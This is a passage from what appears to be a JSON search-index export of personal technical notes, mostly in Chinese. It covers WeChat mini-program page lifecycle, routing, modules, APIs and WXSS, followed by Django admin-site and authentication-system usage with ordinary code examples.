手机相册选取一维码   1034 微信支付完成页   1035 公众号自定义菜单   1036 App 分享消息卡片   1037 小程序打开小程序   1038 从另一个小程序返回   1039 摇电视   1042 添加好友搜索框的搜索结果页   1043 公众号模板消息   1044 带 shareTicket 的小程序消息卡片 详情   1045 朋友圈广告   1046 朋友圈广告详情页   1047 扫描小程序码   1048 长按图片识别小程序码   1049 手机相册选取小程序码   1052 卡券的适用门店列表   1053 搜一搜的结果页   1054 顶部搜索框小程序快捷入口   1056 音乐播放器菜单   1057 钱包中的银行卡详情页   1058 公众号文章   1059 体验版小程序绑定邀请页   1064 微信连Wi-Fi状态栏   1067 公众号文章广告   1068 附近小程序列表广告   1069 移动应用   1071 钱包中的银行卡列表页   1072 二维码收款页面   1073 客服消息列表下发的小程序消息卡片   1074 公众号会话下发的小程序消息卡片   1077 摇周边   1078 连Wi-Fi成功页   1079 微信游戏中心   1081 客服消息下发的文字链   1082 公众号会话下发的文字链   1084 朋友圈广告原生页   1089 微信聊天主界面下拉，「最近使用」栏（基础库2.2.4版本起包含「我的小程序」栏）   1090 长按小程序右上角菜单唤出最近使用历史   1091 公众号文章商品卡片   1092 城市服务入口   1095 小程序广告组件   1096 聊天记录   1097 微信支付签约页   1099 页面内嵌插件   1102 公众号 profile 页服务预览   1103 发现栏小程序主入口，「我的小程序」列表（基础库2.2.4版本起废弃）   1104 微信聊天主界面下拉，「我的小程序」栏（基础库2.2.4版本起废弃）     对于小程序，可以在 App 的 onLaunch 和 onShow，或wx.getLaunchOptionsSync 中获取上述场景值。 对于小游戏，可以在 wx.getLaunchOptionsSync 和 wx.onShow 中获取上述场景值  部分场景值下还可以获取来源应用、公众号或小程序的appId。\nTip: 由于Android系统限制，目前还无法获取到按 Home 键退出到桌面，然后从桌面再次进小程序的场景值，对于这种情况，会保留上一次的场景值。\n"},{"id":366,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/miniprogram/3.logiclayer/3.registrationpage/","title":"3. Registration Page","section":"3.LogicLayer","content":"注册页面 Page #  Page(Object) #  Page(Object) 函数用来注册一个页面。接受一个 Object 类型参数，其指定页面的初始数据、生命周期回调、事件处理函数等。\nObject 参数说明：\n   属性 类型 描述     data Object 页面的初始数据   onLoad Function 生命周期回调—监听页面加载   onShow Function 生命周期回调—监听页面显示   onReady Function 生命周期回调—监听页面初次渲染完成   onHide Function 生命周期回调—监听页面隐藏   onUnload Function 生命周期回调—监听页面卸载   onPullDownRefresh Function 监听用户下拉动作   onReachBottom Function 页面上拉触底事件的处理函数   onShareAppMessage Function 用户点击右上角转发   onPageScroll Function 页面滚动触发事件的处理函数   onResize Function 页面尺寸改变时触发，详见 响应显示区域变化   onTabItemTap Function 当前是 tab 页时，点击 tab 时触发   其他 Any 开发者可以添加任意的函数或数据到 Object 参数中，在页面的函数中用 this 可以访问    除了 Page ，作为高级用法，页面可以像自定义组件一样使用 Component 来创建，这样就可以使用自定义组件的特性，如 behaviors 等。具体细节请阅读 Component 构造器 章节。\n初始数据 #  data 是页面第一次渲染使用的初始数据。\n页面加载时，data 将会以JSON字符串的形式由逻辑层传至渲染层，因此data中的数据必须是可以转成JSON的类型：字符串，数字，布尔值，对象，数组。\n渲染层可以通过 WXML 对数据进行绑定。\n比如 wxml 和 js 文件可以这么写：\n\u0026lt;view\u0026gt;{{text}}\u0026lt;/view\u0026gt; \u0026lt;view\u0026gt;{{array[0].msg}}\u0026lt;/view\u0026gt; Page({ data: { text: \u0026#39;init data\u0026#39;, array: [{msg: \u0026#39;1\u0026#39;}, {msg: \u0026#39;2\u0026#39;}] } }) 声明周期回调函数 #  生命周期的触发以及页面的路由方式详见\n  onLoad(Object query)：页面加载时触发。一个页面只会调用一次，可以在 onLoad 的参数中获取打开当前页面路径中的参数。\n  onShow()：页面显示/切入前台时触发。\n  onReady()：页面初次渲染完成时触发。一个页面只会调用一次，代表页面已经准备妥当，可以和视图层进行交互。\n  onHide()：页面隐藏/切入后台时触发。 如 navigateTo 或底部 tab 切换到其他页面，小程序切入后台等。\n  onUnload()：页面卸载时触发。如redirectTo或navigateBack到其他页面时。\n  页面处理函数 #    onPullDownRefresh()：监听用户下拉刷新事件。\n  需要在app.json的window选项中或页面配置中开启enablePullDownRefresh。\n  可以通过wx.startPullDownRefresh触发下拉刷新，调用后触发下拉刷新动画，效果与用户手动下拉刷新一致。\n  当处理完数据刷新后，wx.stopPullDownRefresh可以停止当前页面的下拉刷新。\n    onReachBottom()：监听用户上拉触底事件。\n  可以在app.json的window选项中或页面配置中设置触发距离onReachBottomDistance。\n  在触发距离内滑动期间，本事件只会被触发一次。\n    onPageScroll(Object)：监听用户滑动页面事件。\nObject 属性 scrollTop 表示页面在垂直方向已滚动的距离（单位px）。\n注意：请只在需要的时候才在 page 中定义此方法，不要定义空方法。以减少不必要的事件派发对渲染层-逻辑层通信的影响。\n  onShareAppMessage(Object)：监听用户点击页面内转发按钮（`` 组件 open-type=\u0026quot;share\u0026quot;）或右上角菜单“转发”按钮的行为，并自定义转发内容。\n注意：只有定义了此事件处理函数，右上角菜单才会显示“转发”按钮\n Object 参数：  from：转发事件来源。 button：页面内转发按钮； menu：右上角转发菜单； target：如果 from 值是 button，则 target 是触发这次转发事件的 button，否则为 undefined webViewUrl：页面中包含组件时，返回当前的url   此事件需要 return 一个 Object，用于自定义转发内容，返回内容如下：  title：转发标题，默认是当前小程序名称； path：转发路径，默认是当前页面 path。必须是以 / 开头的完整路径； imageUrl：自定义图片路径，可以是本地文件路径、代码包文件路径或者网络图片路径。支持PNG及JPG。显示图片长宽比是 5:4。    示例代码：\nPage({ onShareAppMessage(res) { if (res.from === \u0026#39;button\u0026#39;) { // 来自页面内转发按钮  console.log(res.target) } return { title: \u0026#39;自定义转发标题\u0026#39;, path: \u0026#39;/page/user?id=123\u0026#39; } } })   onResize(object)：小程序屏幕旋转时触发。详见 响应显示区域变化\n  TabItemTap(Object)：点击 tab 时触发。\nObject 属性 index、pagePath、text。\nPage({ onTabItemTap(item) { console.log(item.index) console.log(item.pagePath) console.log(item.text) } })   组件事件处理函数 #  Page 中还可以定义组件事件处理函数。在渲染层的组件中加入事件绑定，当事件被触发时，就会执行 Page 中定义的事件处理函数。\n比如在 wxml 和 js 中写入以下的两段代码：\n\u0026lt;view bindtap=\u0026#34;viewTap\u0026#34;\u0026gt;click me\u0026lt;/view\u0026gt; Page({ viewTap() { console.log(\u0026#39;view tap\u0026#39;) } }) 路由 #  Page.route：到当前页面的路径，类型为String。\nPage({ onShow() { console.log(this.route) } }) setData #  Page.prototype.setData(Object data, Function callback)：函数用于将数据从逻辑层发送到视图层（异步），同时改变对应的 this.data 的值（同步）。\n参数说明：\n   字段 类型 必填 描述 最低版本     data Object 是 这次要改变的数据    callback Function 否 setData引起的界面更新渲染完毕后的回调函数 1.5.0    Object 以 key: value 的形式表示，将 this.data 中的 key 对应的值改变成 value。\n其中 key 可以以数据路径的形式给出，支持改变数组中的某一项或对象的某个属性，如 array[2].message，a.b.c.d，并且不需要在 this.data 中预先定义。\n注意：\n 直接修改 this.data 而不调用 this.setData 是无法改变页面的状态的，还会造成数据不一致。 仅支持设置可 JSON 化的数据。 单次设置的数据不能超过1024kB，请尽量避免一次设置过多的数据。 请不要把 data 中任何一项的 value 设为 undefined ，否则这一项将不被设置并可能遗留一些潜在问题。  示例代码：\n\u0026lt;!--index.wxml--\u0026gt; \u0026lt;view\u0026gt;{{text}}\u0026lt;/view\u0026gt; \u0026lt;button bindtap=\u0026#34;changeText\u0026#34;\u0026gt;Change normal data\u0026lt;/button\u0026gt; \u0026lt;view\u0026gt;{{num}}\u0026lt;/view\u0026gt; \u0026lt;button bindtap=\u0026#34;changeNum\u0026#34;\u0026gt;Change normal num\u0026lt;/button\u0026gt; \u0026lt;view\u0026gt;{{array[0].text}}\u0026lt;/view\u0026gt; \u0026lt;button bindtap=\u0026#34;changeItemInArray\u0026#34;\u0026gt;Change Array data\u0026lt;/button\u0026gt; \u0026lt;view\u0026gt;{{object.text}}\u0026lt;/view\u0026gt; \u0026lt;button bindtap=\u0026#34;changeItemInObject\u0026#34;\u0026gt;Change Object data\u0026lt;/button\u0026gt; \u0026lt;view\u0026gt;{{newField.text}}\u0026lt;/view\u0026gt; \u0026lt;button bindtap=\u0026#34;addNewField\u0026#34;\u0026gt;Add new data\u0026lt;/button\u0026gt; // index.js Page({ data: { text: \u0026#39;init data\u0026#39;, num: 0, array: [{text: \u0026#39;init data\u0026#39;}], object: { text: \u0026#39;init data\u0026#39; } }, changeText() { // this.data.text = \u0026#39;changed data\u0026#39; // 不要直接修改 this.data  // 应该使用 setData  this.setData({ text: \u0026#39;changed data\u0026#39; }) }, changeNum() { // 或者，可以修改 this.data 之后马上用 setData 设置一下修改了的字段  this.data.num = 1 this.setData({ num: this.data.num }) }, changeItemInArray() { // 对于对象或数组字段，可以直接修改一个其下的子字段，这样做通常比修改整个对象或数组更好  this.setData({ \u0026#39;array[0].text\u0026#39;: \u0026#39;changed data\u0026#39; }) }, changeItemInObject() { this.setData({ \u0026#39;object.text\u0026#39;: \u0026#39;changed data\u0026#39; }) }, addNewField() { this.setData({ \u0026#39;newField.text\u0026#39;: \u0026#39;new data\u0026#39; }) } }) 生命周期 #  下图表示了一个页面的声明周期：\n"},{"id":367,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/miniprogram/3.logiclayer/4.route/","title":"4. Route","section":"3.LogicLayer","content":"页面路由 #  页面栈 #  框架以栈的形式维护了当前的所有页面。 当发生路由切换的时候，页面栈的表现如下：\n   路由方式 页面栈表现     初始化 新页面入栈   打开新页面 新页面入栈   页面重定向 当前页面出栈，新页面入栈   页面返回 页面不断出栈，直到目标返回页   Tab 切换 页面全部出栈，只留下新的 Tab 页面   重加载 页面全部出栈，只留下新的页面    getCurrentPages() #  getCurrentPages() 函数用于获取当前页面栈的实例，以数组形式按栈的顺序给出，第一个元素为首页，最后一个元素为当前页面。\n注意：\n 不要尝试修改页面栈，会导致路由以及页面状态错误。 不要在 App.onLaunch 的时候调用 getCurrentPages()，此时 page 还没有生成。  路由方式 #  对于路由的触发方式以及页面生命周期函数如下：\n   路由方式 触发时机 路由前页面 路由后页面     初始化 小程序打开的第一个页面  onLoad, onShow   打开新页面 调用 API wx.navigateTo 或使用组件 `` onHide onLoad, onShow   页面重定向 调用 API wx.redirectTo 或使用组件 `` onUnload onLoad, onShow   页面返回 调用 API wx.navigateBack 或使用组件``或用户按左上角返回按钮 onUnload onShow   Tab 切换 调用 API wx.switchTab 或使用组件 `` 或用户切换 Tab  各种情况请参考下表   重启动 调用 API wx.reLaunch 或使用组件 `` onUnload onLoad, onShow    Tab 切换对应的生命周期（以 A、B 页面为 Tabbar 页面，C 是从 A 页面打开的页面，D 页面是从 C 页面打开的页面为例）：\n   当前页面 路由后页面 触发的生命周期（按顺序）     A A Nothing happend   A B A.onHide(), B.onLoad(), B.onShow()   A B（再次打开） A.onHide(), B.onShow()   C A C.onUnload(), A.onShow()   C B C.onUnload(), B.onLoad(), B.onShow()   D B D.onUnload(), C.onUnload(), B.onLoad(), B.onShow()   D（从转发进入） A D.onUnload(), A.onLoad(), A.onShow()   D（从转发进入） B D.onUnload(), B.onLoad(), B.onShow()    Tips:\n navigateTo, redirectTo 只能打开非 tabBar 页面。 switchTab 只能打开 tabBar 页面。 reLaunch 可以打开任意页面。 页面底部的 tabBar 由页面决定，即只要是定义为 tabBar 的页面，底部都有 tabBar。 调用页面路由带的参数可以在目标页面的onLoad中获取。  "},{"id":368,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/miniprogram/3.logiclayer/5.modular/","title":"5. Modular","section":"3.LogicLayer","content":"模块化 #  文件作用域 #  在 JavaScript 文件中声明的变量和函数只在该文件中有效；不同的文件中可以声明相同名字的变量和函数，不会互相影响。\n通过全局函数 getApp() 可以获取全局的应用实例，如果需要全局的数据可以在 App() 中设置，如：\n// app.js App({ globalData: 1 }) // a.js // The localValue can only be used in file a.js. const localValue = \u0026#39;a\u0026#39; // Get the app instance. const app = getApp() // Get the global data and change it. app.globalData++ // b.js // You can redefine localValue in file b.js, without interference with the localValue in a.js. const localValue = \u0026#39;b\u0026#39; // If a.js it run before b.js, now the globalData shoule be 2. console.log(getApp().globalData) 模块化 #  可以将一些公共的代码抽离成为一个单独的 js 文件，作为一个模块。模块只有通过 module.exports 或者 exports 才能对外暴露接口。\n需要注意的是：\n exports 是 module.exports 的一个引用，因此在模块里边随意更改 exports 的指向会造成未知的错误。所以更推荐开发者采用 module.exports 来暴露模块接口，除非你已经清晰知道这两者的关系。 小程序目前不支持直接引入 node_modules , 开发者需要使用到 node_modules 时候建议拷贝出相关的代码到小程序的目录中或者使用小程序支持的 npm 功能。  // common.js function sayHello(name) { console.log(`Hello ${name}!`) } function sayGoodbye(name) { console.log(`Goodbye ${name}!`) } module.exports.sayHello = sayHello exports.sayGoodbye = sayGoodbye 在需要使用这些模块的文件中，使用 require(path) 将公共代码引入\nconst common = require(\u0026#39;common.js\u0026#39;) Page({ helloMINA() { common.sayHello(\u0026#39;MINA\u0026#39;) }, goodbyeMINA() { common.sayGoodbye(\u0026#39;MINA\u0026#39;) } }) NOTICE: require 暂时不支持绝对路径\n"},{"id":369,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/miniprogram/3.logiclayer/6.api/","title":"6. API","section":"3.LogicLayer","content":"API #  小程序开发框架提供丰富的微信原生 API，可以方便的调起微信提供的能力，如获取用户信息，本地存储，支付功能等。详细介绍请参考 API 文档。\n事件监听 API #  我们约定，以 on 开头的 API 用来监听某个事件是否触发，如：wx.onSocketOpen，wx.onCompassChange 等。\n这类 API 接受一个回调函数作为参数，当事件触发时会调用这个回调函数，并将相关数据以参数形式传入。\n例如：\nwx.onCompassChange(function (res) { console.log(res.direction) }) 同步 API #  我们约定，以 Sync 结尾的 API 都是同步 API， 如 wx.setStorageSync，wx.getSystemInfoSync 等。此外，也有一些其他的同步 API，如 wx.createWorker，wx.getBackgroundAudioManager 等，详情参见 API 文档中的说明。\n同步 API 的执行结果可以通过函数返回值直接获取，如果执行出错会抛出异常。\ntry { wx.setStorageSync(\u0026#39;key\u0026#39;, \u0026#39;value\u0026#39;) } catch (e) { console.error(e) } 异步 API #  大多数 API 都是异步 API，如 wx.request，wx.login 等。这类 API 接口通常都接受一个 Object 类型的参数，这个参数都支持按需指定以下字段来接收接口调用结果：\nObject 参数说明：\n   参数名 类型 必填 说明     success function 否 接口调用成功的回调函数   fail function 否 接口调用失败的回调函数   complete function 否 接口调用结束的回调函数（调用成功、失败都会执行）   其他 Any - 接口定义的其他参数    回调函数的参数：\nsuccess，fail，complete 函数调用时会传入一个 Object 类型参数，包含以下字段：\n   属性 类型 说明     errMsg string 错误信息，如果调用成功返回 ${apiName}:ok   errCode number 错误码，仅部分 API 支持，具体含义请参考对应 API 文档，成功时为 0。   其他 Any 接口返回的其他数据    异步 API 的执行结果需要通过 Object 类型的参数中传入的对应回调函数获取。部分异步 API 也会有返回值，可以用来实现更丰富的功能，如 wx.request，wx.connectSockets 等。\n例如：\nwx.login({ success(res) { console.log(res.code) } }) "},{"id":370,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/miniprogram/4.viewlayer/1.wxml/","title":"1. Wxml","section":"4.ViewLayer","content":"\u0000\n出 bug 了：https://developers.weixin.qq.com/miniprogram/dev/framework/view/wxml/\nWXML #  数据绑定 #  列表渲染 #  条件渲染 #  模板 #  事件 #  引用 #  import #  import 有作用域的概念，即只会 import 目标文件中定义的 template，而不会 import 目标文件 import 的 template。\ninclude #  include 可以将目标文件除了 \u0026lt;template/\u0026gt; \u0026lt;wxs/\u0026gt; 外的整个代码引入，相当于是拷贝到 include 位置，如：\n"},{"id":371,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/miniprogram/4.viewlayer/2.wxss/","title":"2. Wxss","section":"4.ViewLayer","content":"WXSS #  WXSS(WeiXin Style Sheets)是一套样式语言，用于描述 WXML 的组件样式。\nWXSS 用来决定 WXML 的组件应该怎么显示。\n为了适应广大的前端开发者，WXSS 具有 CSS 大部分特性。同时为了更适合开发微信小程序，WXSS 对 CSS 进行了扩充以及修改。\n与 CSS 相比，WXSS 扩展的特性有：\n 尺寸单位 样式导入  尺寸单位 #   rpx（responsive pixel）: 可以根据屏幕宽度进行自适应。规定屏幕宽为750rpx。如在 iPhone6 上，屏幕宽度为375px，共有750个物理像素，则750rpx = 375px = 750物理像素，1rpx = 0.5px = 1物理像素。     设备 rpx换算px (屏幕宽度/750) px换算rpx (750/屏幕宽度)     iPhone5 1rpx = 0.42px 1px = 2.34rpx   iPhone6 1rpx = 0.5px 1px = 2rpx   iPhone6 Plus 1rpx = 0.552px 1px = 1.81rpx    建议： 开发微信小程序时设计师可以用 iPhone6 作为视觉稿的标准。\n注意： 在较小的屏幕上不可避免的会有一些毛刺，请在开发时尽量避免这种情况。\n样式导入 #  使用 @import 语句可以导入外联样式表，@import 后跟需要导入的外联样式表的相对路径，用;表示语句结束。\n示例代码：\n/** common.wxss **/ .small-p { padding:5px; } /** app.wxss **/ @import \u0026#34;common.wxss\u0026#34;; .middle-p { padding:15px; } 内联样式 #  框架组件上支持使用 style、class 属性来控制组件的样式。\n  style：静态的样式统一写到 class 中。style 接收动态的样式，在运行时会进行解析，请尽量避免将静态的样式写进 style 中，以免影响渲染速度。\n\u0026lt;view style=\u0026#34;color:{{color}};\u0026#34; /\u0026gt;   class：用于指定样式规则，其属性值是样式规则中类选择器名(样式类名)的集合，样式类名不需要带上.，样式类名之间用空格分隔。\n\u0026lt;view class=\u0026#34;normal_view\u0026#34; /\u0026gt;   选择器 #  目前支持的选择器有：\n   选择器 样例 样例描述     .class .intro 选择所有拥有 class=\u0026ldquo;intro\u0026rdquo; 的组件   #id #firstname 选择拥有 id=\u0026ldquo;firstname\u0026rdquo; 的组件   element view 选择所有 view 组件   element, element view, checkbox 选择所有文档的 view 组件和所有的 checkbox 组件   ::after view::after 在 view 组件后边插入内容   ::before view::before 在 view 组件前边插入内容    全局样式与局部样式 #  定义在 app.wxss 中的样式为全局样式，作用于每一个页面。在 page 的 wxss 文件中定义的样式为局部样式，只作用在对应的页面，并会覆盖 app.wxss 中相同的选择器。\n"},{"id":372,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/miniprogram/4.viewlayer/3.component/","title":"3. Component","section":"4.ViewLayer","content":"基础组件 #  框架为开发者提供了一系列基础组件，开发者可以通过组合这些基础组件进行快速开发。详细介绍请参考组件文档。\n什么是组件：\n 组件是视图层的基本组成单元。 组件自带一些功能与微信风格一致的样式。 一个组件通常包括 开始标签 和 结束标签，属性 用来修饰这个组件，内容 在两个标签之内。  \u0026lt;tagname property=\u0026#34;value\u0026#34;\u0026gt;Content goes here ...\u0026lt;/tagname\u0026gt; 注意：所有组件与属性都是小写，以连字符-连接\n属性类型 #     类型 描述 注解     Boolean 布尔值 组件写上该属性，不管是什么值都被当作 true；只有组件上没有该属性时，属性值才为false。 如果属性值为变量，变量的值会被转换为Boolean类型   Number 数字 1, 2.5   String 字符串 \u0026quot;string\u0026quot;   Array 数组 [ 1, \u0026quot;string\u0026quot; ]   Object 对象 { key: value }   EventHandler 事件处理函数名 \u0026quot;handlerName\u0026quot; 是 Page 中定义的事件处理函数名   Any 任意属性     公共属性 #  所有组件都有以下属性：\n   属性名 类型 描述 注解     id String 组件的唯一标示 保持整个页面唯一   class String 组件的样式类 在对应的 WXSS 中定义的样式类   style String 组件的内联样式 可以动态设置的内联样式   hidden Boolean 组件是否显示 所有组件默认显示   data-* Any 自定义属性 组件上触发的事件时，会发送给事件处理函数   bind* / catch* EventHandler 组件的事件 详见事件    特殊属性 #  几乎所有组件都有各自定义的属性，可以对该组件的功能或样式进行修饰，请参考各个组件的定义。\n"},{"id":373,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/php/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/","title":"基础语法自学笔记","section":"PHP","content":"自学笔记 (pdf) #  \r"},{"id":374,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/php/%E8%BF%9B%E9%98%B6%E8%AF%AD%E6%B3%95%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/","title":"进阶语法自学笔记","section":"PHP","content":"自学笔记 (pdf) #  \r"},{"id":375,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/python/celery/","title":"Celery","section":"Python","content":" 官方文档：http://docs.celeryproject.org/\n Celery #  celery 是一个用于实现定时任务的 python 库。\nFirst Step with Django #   http://docs.celeryproject.org/en/latest/django/first-steps-with-django.html\n "},{"id":376,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/python/django/admin-site/","title":"Admin Site","section":"Django","content":" 官方文档：https://docs.djangoproject.com/en/2.1/ref/contrib/admin/\n Django admin site #  Overview #  If you’re not using the default project template, here are the requirements:\n Add 'django.contrib.admin' and its dependencies -django.contrib.auth, django.contrib.contenttypes,django.contrib.messages, and django.contrib.sessions - to yourINSTALLED_APPS setting. Configure a DjangoTemplates backend in your TEMPLATES setting withdjango.contrib.auth.context_processors.auth anddjango.contrib.messages.context_processors.messages in the 'context_processors' option of OPTIONS. If you’ve customized the MIDDLEWARE setting,django.contrib.auth.middleware.AuthenticationMiddlewareand django.contrib.messages.middleware.MessageMiddlewaremust be included. Hook the admin’s URLs into your URLconf.  If you need to create a user to login with, use the createsuperuser command. By default, logging in to the admin requires that the user has the is_superuser or is_staff attribute set to True.\n所以，除超级用户外，设置一下属性即可允许一个普通用户登录 admin 后台管理界面：\nnormal_user.is_staff = True Finally, determine which of your application’s models should be editable in the admin interface. For each of those models, register them with the admin as described in ModelAdmin.（即需要通过 ModelAdmin 注册可以在 admin-site 中修改的表单）\nOther topics：\n Admin actions The Django admin documentation generator JavaScript customizations in the admin  ModelAdmin #  Usage #  The ModelAdmin class is the representation of a model in the admin interface. Usually, these are stored in a file named admin.py in your application. Let’s take a look at a very simple example of the ModelAdmin:\nfrom django.contrib import admin from myproject.myapp.models import Author class AuthorAdmin(admin.ModelAdmin): pass admin.site.register(Author, AuthorAdmin) 当然你也可以不显示地声明一个 ModelAdmin，这时，Django 将会使用默认的借口做为函数的参数：\nfrom django.contrib import admin from myproject.myapp.models import Author admin.site.register(Author) register decorator #  There is also a decorator for registering your ModelAdmin classes:\nfrom django.contrib import admin from .models import Author @admin.register(Author) class AuthorAdmin(admin.ModelAdmin): pass It’s given one or more model classes to register with the ModelAdmin. If you’re using a custom AdminSite, pass it using the site keyword argument:\nfrom django.contrib import admin from .models import Author, Editor, Reader from myproject.admin_site import custom_admin_site @admin.register(Author, Reader, Editor, site=custom_admin_site) class PersonAdmin(admin.ModelAdmin): pass Discovery of admin files #  没看懂，算了。\nModelAdmin options #  The ModelAdmin is very flexible. It has several options for dealing with customizing the interface. All options are defined on the ModelAdmin subclass:\n ModelAdmin.actions：可以在 admin-site 页面的下拉列表中，定义自己的 actions 函数。详见：AdminAction ModelAdmin.actions_on_top、ModelAdmin.actions_on_bottom：控制下拉列表在 admin-site 页面中存在的位置。 ModelAdmin.actions_selection_counter：控制是否在动作下拉栏里面显示选择计数器。  （还有很多）\nModelAdmin methods #  \u0026hellip;\nAdding custom validation to admin #  InlineModelAdmin #  Usage #  Important class:\n  class InlineModelAdmin\n  class TabularInline\n  class StackedInline\n  The admin interface has the ability to edit models on the same page as a parent model. These are called inlines.\nSuppose you have these two models:\nfrom django.db import models class Author(models.Model): name = models.CharField(max_length=100) class Book(models.Model): author = models.ForeignKey(Author, on_delete=models.CASCADE) title = models.CharField(max_length=100) You can edit the books authored by an author on the author page. You add inlines to a model by specifying them in a ModelAdmin.inlines:\nfrom django.contrib import admin class BookInline(admin.TabularInline): model = Book class AuthorAdmin(admin.ModelAdmin): inlines = [ BookInline, ] Django provides two subclasses of InlineModelAdmin and they are:\n TabularInline StackedInline  The difference between these two is merely the template used to render them.\nInlineModelAdmin options #  InlineModelAdmin shares many of the same features as ModelAdmin, and adds some of its own (the shared features are actually defined in theBaseModelAdmin superclass).\n"},{"id":377,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/python/django/authentication-system/","title":"Authentication System","section":"Django","content":" 学习网址：\n https://www.jianshu.com/p/17d4c2182ef7 http://www.liujiangblog.com/course/django/178 https://docs.djangoproject.com/en/1.11/topics/auth/ https://juejin.im/post/5987f51e51882549475a916d  官方的参考文档：https://docs.djangoproject.com/zh-hans/2.1/ref/contrib/auth/\n Authentication System #  Using the Django authentication system #  User Object #  User 是 Django 提供的一个对象，默认对象的主要属性是：username，password，email，first_name，last_name。参阅完整的文档：\n  关于 User 模块的操作（比如：使用 create_user() 函数创建对象）\nfrom django.contrib.auth import get_user_model from django.contribute.auth.models import User # 导入 User 这个模块有以上两种方法 User = get_user_model() # 该行获得 User 这个模块，与导入的 User 指向同一个模块 Rookie_User = User.objects.create_user(\u0026#39;Rookie\u0026#39;, \u0026#39;email@e.com\u0026#39;, \u0026#39;passwd\u0026#39;) Rookie_User = User.objects.create(username=\u0026#34;Rookie001\u0026#34;) # 创建一个名为 ‘Rookie001’ 的 User 对象，返回该对象 User.objects.get(username=\u0026#34;Rookie001\u0026#34;) # 查找一个满足特定条件的 User 类的对象 Rookie_User.last_name = \u0026#39;Smith\u0026#39; # 动态设置对象的其他成员 user.save() # 将对象保存到数据库   创建超级用户：使用 createsuperuser 命令：\n$ python manage.py createsuperuser --username=john --email=email@e.com   更改密码：以下两种方法：\n$ python manage.py changepassword \u0026lt;username\u0026gt; from django.contrib.auth.models import User Rookie_User = User.objects.get(username=\u0026#39;john\u0026#39;) Rookie_User.set_password(\u0026#39;new_passwd\u0026#39;) Rookie_User.save()   验证用户，authenticate 函数如果后端有效则返回 User 对象，若无效或引发 PermissionDenies 则返回 None，例如：\nfrom django.contrib.auth import authenticate user = authenticate(username=\u0026#39;john\u0026#39;, password=\u0026#39;secret\u0026#39;) if user is not None: # A backend authenticated the credentials else: # No backend authenticated the credentials   Permission and Authorization #  默认情况下，使用 python manage.py migrate 命令时，Django 会给每个已经存在的 model 添加默认的权限。假设有个叫 foo 的应用中有个叫 bar 的模块，可以使用以下的命令查看权限：\nuser.has_perm(\u0026#39;foo.add_bar\u0026#39;) # 查看用户 user 是否有添加 bar 这个模块对象的权限 user.has_perm(\u0026#39;foo.change_bar\u0026#39;) # 查看用户 user 是否有更改 bar 这个模块对象的权限 user.has_perm(\u0026#39;foo.delete_bar\u0026#39;) # 查看用户 user 是否有删除 bar 这个模块对象的权限 Group Object #  Django提供了一个 django.contrib.auth.models.Group 模型，该model可用于给用户分组，实现批量管理。用户和组属于多对多的关系。用法实例如下：\nfrom django.contrib.auth.models import Group Rookie_Group = Group.objects.create(name=\u0026#34;Rookie\u0026#34;) # 创建一个名为 ‘Rookie’ 的 Group 对象，返回该对象 Rookie_User.groups.add(Rookie_Group) # 将 Rookie_User 这个用户加入 Rookie_Group 这个用户组 Rookie_Group.user_set.all() # 获取该用户组内的全部用户构成的一个列表 Group 模块中有成员：Permissions 模块的一个对象，用于管理用户的权限，其使用方法如下：\ngroup.permissions.set([permission_list]) # 用于设置用户组的权限 group.permissions.add(permission1, permission2, ...) # 给用户组添加权限 group.permissions.remove(permission1, permission2, ...) # 移除用户组中的某些权限 group.permissions.clear() # 清空该用户组的所有权限 Permission 也可以通过以下的方式进行自定义，下面给出一个用法实例：\nfrom myapp.models import BlogPost from django.contrib.auth,models import Permission from django.contrib.contenttypes.models import ContentType content_type = ContentType.objects.get_for_models(BlogPost) permisstion = Permission.objects.create( codename=\u0026#39;can_publish\u0026#39;, name=\u0026#39;Can Publish Posts\u0026#39;, content_type=content_type, ) 你可以通过 User 模型的 user_permissions 属性或者 Group 模型的 permissions 属性为用户添加该权限。\n权限检查后，会被缓存在用户对象中，只有当对象再次被加载，权限才会更新。\nAuthentication in Web requests #  Django 在请求对象中使用 sessions 和中间关联请求进行用户登录认证。\n每一次请求中都包含一个 request.user 属性，表示当前用户。如果该用户未登陆，该属性的值是一个 AnonymousUser 实例（匿名用户），如果已经登录，该属性就是一个User模型的实例。\n可以使用 is_authenticated 进行判断，若是匿名用户，则返回 False。\nHow to log a user in? #  使用认证系统提供的 login() 方法登录用户。它接收一个 HttpRequest 参数和一个 User 对象参数。该方法会把用户的 ID 保存在 Django 的 session 中。下面是一个认证和登陆的例子：\nfrom django.contrib.auth import authenticate, login def my_view(request): username = request.POST[\u0026#39;username\u0026#39;] password = request.POST[\u0026#39;password\u0026#39;] user = authenticate(username=username, password=password) if user is not None: login(request, user) # 跳转到成功页面 ... else: # 返回一个非法登录的错误页面 ... How to log a user out？ #  同样可以使用 Django 系统提供的函数：\nfrom django.contrib.auth import logout def logout_view(request): logout(request) # 跳转到成功的页面 注意，被logout的用户如何没登录，不会抛出错误。 一旦logout，当前请求中的session数据都会被清空。\nLimiting access to logged-in users #  主要是以下几种方法：\n  原始方法，将用户重定向到登录页面：\nfrom django.conf import settings from django.shortcuts import redirect def my_view(request): if not request.user.is_authenticated: return redirect(\u0026#39;%s?next=%s\u0026#39; % (settings.LOGIN_URL, request.path)) # ...   使用装饰器，被装饰的 views 只有用户登录后才可以访问。原型为：\nlogin_required(redirect_field_name=\u0026#39;next\u0026#39;, login_url=None)[source] 使用方法大致如下：\nfrom django.contrib.auth.decorators import login_required @login_required def 